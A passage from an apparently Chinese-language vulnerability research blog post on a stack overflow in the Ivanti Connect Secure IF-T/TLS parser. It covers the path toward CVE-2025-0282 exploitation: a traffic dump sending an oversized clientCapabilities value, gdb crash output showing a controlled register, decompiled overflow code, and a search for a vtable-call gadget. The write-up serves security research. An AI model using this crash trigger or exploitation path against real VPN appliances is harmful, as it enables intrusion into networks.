class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">$ ./openconnect 172.16.64.222 --protocol=pulse --dump-http-traffic -vvv</span><br><span class="line">Attempting to connect to server 172.16.64.222:443</span><br><span class="line">Connected to 172.16.64.222:443</span><br><span class="line">SSL negotiation with 172.16.64.222</span><br><span class="line">Server certificate verify failed: signer not found</span><br><span class="line"></span><br><span class="line">Certificate from VPN server &quot;172.16.64.222&quot; failed verification.</span><br><span class="line"><span class="attribute">Reason</span><span class="punctuation">: </span>signer not found</span><br><span class="line">To trust this server in future, perhaps add this to your command line:</span><br><span class="line">    --servercert pin-sha256:4fW+U987xNSV4e/eojrHz/Cr1pGxIIF0lraaXwBKQ2A=</span><br><span class="line">Enter &#x27;yes&#x27; to accept, &#x27;no&#x27; to abort; anything else to view: yes</span><br><span class="line">Connected to HTTPS on 172.16.64.222 with ciphersuite (TLS1.2)-(RSA)-(AES-256-GCM)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 172.16.64.222</span><br><span class="line">&gt; User-Agent: Open AnyConnect VPN Agent v9.12-unknown</span><br><span class="line">&gt; Content-Type: EAP</span><br><span class="line">&gt; Upgrade: IF-T/TLS 1.0</span><br><span class="line">&gt; Content-Length: 0</span><br><span class="line">&gt;</span><br><span class="line">Got HTTP response: HTTP/1.1 101 Switching Protocols</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>IF-T/TLS 1.0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line">HC_HMAC_VERSION_COOKIE: 1</span><br><span class="line"><span class="attribute">supportSHA2Signature</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span><span class="punctuation">: </span>max-age=31536000</span><br><span class="line"><span class="attribute">accept-ch</span><span class="punctuation">: </span>Sec-CH-UA-Platform-Version</span><br><span class="line">&gt; 0000:  00 00 55 97 00 00 00 01  00 00 00 14 00 00 00 00  |..U.............|</span><br><span class="line">&gt; 0010:  00 01 02 02                                       |....|</span><br><span class="line">Read 20 bytes of IF-T/TLS record</span><br><span class="line">&lt; 0000:  00 00 55 97 00 00 00 02  00 00 00 14 00 00 01 f5  |..U.............|</span><br><span class="line">&lt; 0010:  00 00 00 02                                       |....|</span><br><span class="line">IF-T/TLS version from server: 2</span><br><span class="line">&gt; 0000:  00 00 0a 4c 00 00 00 88  00 00 06 a1 00 00 00 01  |...L............|</span><br><span class="line">&gt; 0010:  63 6c 69 65 6e 74 48 6f  73 74 4e 61 6d 65 3d 75  |clientHostName=u|</span><br><span class="line">&gt; 0020:  62 75 6e 74 75 20 63 6c  69 65 6e 74 49 70 3d 31  |buntu clientIp=1|</span><br><span class="line">&gt; 0030:  39 38 2e 31 39 2e 32 34  39 2e 31 38 38 20 63 6c  |98.19.249.188 cl|</span><br><span class="line">&gt; 0040:  69 65 6e 74 43 61 70 61  62 69 6c 69 74 69 65 73  |ientCapabilities|</span><br><span class="line">&gt; 0050:  3d 31 39 38 2e 31 39 2e  32 34 39 2e 31 38 38 41  |=198.19.249.188A|</span><br><span class="line">&gt; 0060:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0070:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0080:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0090:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0100:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0110:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0120:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0130:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0140:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0150:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0160:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0170:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0180:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0190:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0200:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0210:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0220:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0230:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0240:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0250:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0260:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0270:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0280:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0290:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0300:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0310:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0320:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0330:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0340:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0350:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0360:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0370:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0380:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0390:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0400:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0410:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0420:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0430:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0440:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0450:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0460:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0470:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0480:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0490:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0500:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0510:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0520:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0530:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0540:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0550:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0560:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0570:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0580:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0590:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0600:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0610:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0620:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0630:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0640:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0650:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0660:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0670:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0680:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0690:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 0a  |AAAAAAAAAAAAAAA.|</span><br><span class="line">&gt; 06a0:  00                                                |.|</span><br><span class="line">Read 20 bytes of IF-T/TLS record</span><br><span class="line">&lt; 0000:  00 00 55 97 00 00 00 05  00 00 00 14 00 00 01 f6  |..U.............|</span><br><span class="line">&lt; 0010:  00 0a 4c 01                                       |..L.|</span><br><span class="line">&gt; 0000:  00 00 55 97 00 00 00 06  00 00 00 22 00 00 00 02  |..U........&quot;....|</span><br><span class="line">&gt; 0010:  00 0a 4c 01 02 01 00 0e  01 61 6e 6f 6e 79 6d 6f  |..L......anonymo|</span><br><span class="line">&gt; 0020:  75 73                                             |us|</span><br></pre></td></tr></table></figure>
<p>可以看到构超级长的 <code>ientCapabilities</code> 参数的时候就会栈溢出</p>
<p>free 的 崩溃现场</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">eax            0x0      0</span><br><span class="line">edi            0xff856370       -8035472</span><br><span class="line">esi            0x1      1</span><br><span class="line">edx            0xf1a8d004       -240594940</span><br><span class="line">&#x3D;&gt; 0xf4f73d1d &lt;free+45&gt;:        mov    esi,DWORD PTR [ecx-0x4]</span><br><span class="line">   0xf4f73d20 &lt;free+48&gt;:        lea    edx,[ecx-0x8]</span><br><span class="line">   0xf4f73d23 &lt;free+51&gt;:        test   esi,0x2</span><br><span class="line">   0xf4f73d29 &lt;free+57&gt;:        jne    0xf4f73d58 &lt;free+104&gt;</span><br><span class="line">   0xf4f73d2b &lt;free+59&gt;:        and    esi,0x4</span><br><span class="line">0xff856110:     0x56723200      0x566dd509      0x566ecbc7      0xf4f73cf8</span><br><span class="line">0xff856120:     0xf7a26000      0x00000001      0xff856370      0xf6d6535f</span><br><span class="line">0xff856130:     0x41414141      0x00000032      0xf7f3abc9      0x5671d000</span><br><span class="line">0xff856140:     0x5671d000      0x56723200      0x00000001      0x5669a4e8</span><br><span class="line">0xff856150:     0xff856370      0x00000289      0x566ed87c      0x566d7c7f</span><br><span class="line">0xf4f73d1d in free () from &#x2F;lib&#x2F;libc.so.6</span><br><span class="line">(gdb) bt</span><br><span class="line">#0  0xf4f73d1d in free () from &#x2F;lib&#x2F;libc.so.6</span><br><span class="line">#1  0xf6d6535f in DSUtilMemPool::~DSUtilMemPool() () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsplibs.so</span><br><span class="line">#2  0x5669a4e8 in ?? ()</span><br><span class="line">#3  0x5669ae7b in ?? ()</span><br><span class="line">#4  0xf5fd0565 in IftTlsParser::parse(unsigned char const*, unsigned int) () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsagentd.so</span><br><span class="line">#5  0xf5fd084e in IftTlsParser::parseData(unsigned char const*, unsigned int) () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsagentd.so</span><br><span class="line">#6  0x56696e48 in ?? ()</span><br><span class="line">#7  0x566133d5 in ?? ()</span><br><span class="line">#8  0x56614446 in ?? ()</span><br><span class="line">#9  0x56614d40 in ?? ()</span><br><span class="line">#10 0xf6c4942e in ?? () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsplibs.so</span><br><span class="line">#11 0xf6c49f2f in DSEvntFds::runDispatcher() () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsplibs.so</span><br><span class="line">#12 0x5663f477 in ?? ()</span><br><span class="line">#13 0x565e0a37 in main ()</span><br><span class="line">(gdb) p&#x2F;x 0x5669a4e8  - $base</span><br><span class="line">$1 &#x3D; 0xe54e8</span><br><span class="line">(gdb) i er ecx</span><br><span class="line">Undefined info command: &quot;er ecx&quot;.  Try &quot;help info&quot;.</span><br><span class="line">(gdb) i r ecx</span><br><span class="line">ecx            0x41414141       1094795585</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl EPMessage::~EPMessage(EPMessage *this)</span><br><span class="line">&#123;</span><br><span class="line">  DSHash::~DSHash((EPMessage *)((char *)this + 4));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">0xf6d0fb31 in DSHash::~DSHash() () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsplibs.so</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line"><span class="built_in">strncpy</span>(dest, (<span class="keyword">const</span> <span class="keyword">char</span> *)a1-&gt;clientCapabilities, v23);<span class="comment">// overflow</span></span><br><span class="line">v24 = <span class="number">46</span>;</span><br><span class="line">v25 = &amp;v57;</span><br><span class="line"><span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)&amp;v57 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  LOBYTE(v24) = <span class="number">44</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v25 = (__int16 *)&amp;v58;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(v25, <span class="number">0</span>, <span class="number">4</span> * (v24 &gt;&gt; <span class="number">2</span>));</span><br><span class="line">v26 = &amp;v25[<span class="number">2</span> * (v24 &gt;&gt; <span class="number">2</span>)];</span><br><span class="line"><span class="keyword">if</span> ( (v24 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">  *v26 = <span class="number">0</span>;</span><br><span class="line">na = <span class="number">46</span>;</span><br><span class="line">(*(<span class="keyword">void</span> (__cdecl **)(struct_a1 *, __int16 *))(*(_DWORD *)a1-&gt;gap0 + <span class="number">72</span>))(a1, &amp;v57);</span><br></pre></td></tr></table></figure>

<p>在溢出之后有一个函数指针的调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [esp+0A0Ch+var_9E0]</span><br><span class="line">mov     eax, [esp+2576]</span><br><span class="line">mov     eax, [eax]</span><br><span class="line">mov     [esp+0A0Ch+src], edx</span><br><span class="line">; 395:     na &#x3D; 46;</span><br><span class="line">mov     edx, [esp+0A0Ch+arg_0]</span><br><span class="line">mov     [esp+0A0Ch+n], 2Eh ; &#39;.&#39; ; int</span><br><span class="line">mov     [esp+0A0Ch+var_A0C], edx</span><br><span class="line">call    dword ptr [eax+48h]</span><br></pre></td></tr></table></figure>

<p>这里是一个this 指针调用虚表函数的功能， 由于虚表指针在栈上， 这个栈是可以被我们覆盖的， 所以我们大概率就是需要找到一个虚表指针，他指向的虚表函数表， 这个表 +0x48 能有合适的gadget， 我一开始的思路是去找所有的虚表定义，看看有没有合适的， 可惜我没有找到， 于是我回到 <a href="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/">https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/</a> 这个文章<sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/ ">[2]</span></a></sup>，观察这个作者的 <code>A Gadget From The Gods</code> ， 最后我用的大概率也是做这个找到的这个gadget<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-7ebb63e11446ebcb90d9700b46299a8b-cf5a79.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-7ebb63e11446ebcb90d9700b46299a8b-cf5a79.png" alt="image.png"></a></p>
<p>在这文章<sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/ ">[2]</span></a></sup>中作者提到了他的 gadget 的具体汇编，第一句是<code>mov ebx, 0xfffffff0 </code>， 第二句是 <code>add esp, 0x204C</code></p>
